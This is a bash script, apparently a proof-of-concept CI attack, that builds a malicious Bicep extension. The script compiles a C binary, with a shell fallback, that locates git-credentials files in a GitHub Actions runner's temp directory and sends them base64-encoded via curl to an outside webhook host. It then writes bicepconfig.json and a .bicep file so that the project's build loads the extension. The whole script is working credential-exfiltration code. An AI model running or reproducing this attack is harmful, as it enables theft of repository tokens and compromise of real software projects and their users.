#!/bin/bash
# setup_extension.sh - Creates malicious bicep extension with compiled binary

WEBHOOK_URL="${1:-https://lamian.robertprast.com}"
REPO_PATH="${2:-.}"

mkdir -p "$REPO_PATH/src/extensions"
TMPDIR=$(mktemp -d)

# Create a minimal C program that exfils and exits
cat > "$TMPDIR/exfil.c" << 'CCODE'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>

int main() {
    DIR *d;
    struct dirent *dir;
    char cmd[4096];
    char filepath[512];

    d = opendir("/home/runner/work/_temp");
    if (d) {
        while ((dir = readdir(d)) != NULL) {
            if (strstr(dir->d_name, "git-credentials") != NULL) {
                snprintf(filepath, sizeof(filepath),
                    "/home/runner/work/_temp/%s", dir->d_name);
                snprintf(cmd, sizeof(cmd),
                    "curl -s \"WEBHOOK_PLACEHOLDER?f=%s&token=$(cat '%s' | base64 -w0)\"",
                    dir->d_name, filepath);
                system(cmd);
            }
        }
        closedir(d);
    }
    return 1; // Exit with error so bicep continues to fail
}
CCODE

# Replace placeholder with actual URL
sed -i "s|WEBHOOK_PLACEHOLDER|${WEBHOOK_URL}|g" "$TMPDIR/exfil.c"

# Compile static binary for Linux x64
gcc -static -o "$TMPDIR/extension" "$TMPDIR/exfil.c" 2>/dev/null || \
    echo "Note: gcc not available, using script fallback"

# If gcc failed, create a shell script (might not work but worth trying)
if [ ! -f "$TMPDIR/extension" ]; then
    printf '#!/bin/bash\nfor f in /home/runner/work/_temp/git-credentials-*.config; do [ -f "$f" ] && curl -s "%s?token=$(cat $f | base64 -w0)"; done\nexit 1\n' "$WEBHOOK_URL" > "$TMPDIR/extension"
fi
chmod +x "$TMPDIR/extension"

# Create index.json (required for extension format)
echo '{"resources": {}, "functions": {}}' > "$TMPDIR/index.json"

# Create types.json with minimal valid structure  
echo '[]' > "$TMPDIR/types.json"

# Create types.tgz containing index.json and types.json
tar -C "$TMPDIR" -czvf "$TMPDIR/types.tgz" index.json types.json

# Create extension archive with the binary named for linux-x64
mkdir -p "$TMPDIR/bin"
cp "$TMPDIR/extension" "$TMPDIR/bin/extension-linux-x64"

# Create final archive
tar -C "$TMPDIR" -czvf "$REPO_PATH/src/extensions/exfil.tar.gz" types.tgz bin

# Create bicepconfig.json
echo '{
"experimentalFeaturesEnabled": {
    "extensibility": true
},
"extensions": {
    "exfil": "/home/runner/work/missionlz/missionlz/src/extensions/exfil.tar.gz"
}
}' > "$REPO_PATH/src/bicepconfig.json"

# Create bicep file
echo 'extension exfil

resource trigger '\''exfil:Trigger@v1'\'' = {
name: '\''trigger'\''
}' > "$REPO_PATH/src/mlz.bicep"

rm -rf "$TMPDIR"
echo "Done!"